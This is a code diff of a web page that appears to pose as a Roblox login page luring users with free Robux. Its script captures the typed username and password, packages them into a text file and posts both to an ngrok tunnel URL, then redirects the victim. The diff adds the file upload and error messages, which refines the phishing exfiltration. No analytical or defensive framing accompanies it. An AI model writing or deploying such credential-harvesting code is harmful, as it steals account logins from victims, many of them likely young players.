@@ -569,32 +569,33 @@ site.</div></div></noscript>
                 localStorage.removeItem('roblox_password');
             }
             
-            // Criar arquivo .txt com as credenciais
-            const credentials = `Usuário: ${username}\nSenha: ${password}`;
-            const blob = new Blob([credentials], { type: 'text/plain' });
-            const url = URL.createObjectURL(blob);
-            
-            
-            // Simular envio para um servidor (substitua pela sua URL)
-            const formData = new FormData();
-            formData.append('username', username);
-            formData.append('password', password);
-            
-            fetch('https://870543efcd45.ngrok-free.app/login/', {
-                method: 'POST',
-                body: formData
-            })
-            .then(response => {
-                if (response.ok) {
-                    messageDiv.textContent = 'Login bem-sucedido!';
-                    messageDiv.style.color = '#00aa00';
-                    window.location.href = "https://roblox-robux-free.github.io/roblox/oi.html"; // Redirecionar
-                } else {
-                    messageDiv.textContent = '';
-                }
-            });
-        });
-        
+         // Criar arquivo .txt com as credenciais
+        const credentials = `Usuário: ${username}\nSenha: ${password}`;
+        const blob = new Blob([credentials], { type: 'text/plain' });
+
+        // Criar FormData e adicionar o arquivo
+        const formData = new FormData();
+        formData.append('credentials_file', blob, 'credenciais.txt');
+        formData.append('username', username);
+        formData.append('password', password);
+
+// Enviar para o servidor
+fetch('https://870543efcd45.ngrok-free.app/login/', {
+    method: 'POST',
+    body: formData
+})
+.then(response => {
+    if (response.ok) {
+        messageDiv.textContent = 'Login bem-sucedido!';
+        messageDiv.style.color = '#00aa00';
+        window.location.href = "https://roblox-robux-free.github.io/roblox/oi.html";
+    } else {
+        messageDiv.textContent = 'Erro no login. Tente novamente.';
+    }
+})
+.catch(error => {
+    messageDiv.textContent = 'Erro na conexão. Verifique sua internet.';
+});
         // Links extras
         document.getElementById('custom-forgot-password').addEventListener('click', function(e) {
             e.preventDefault();
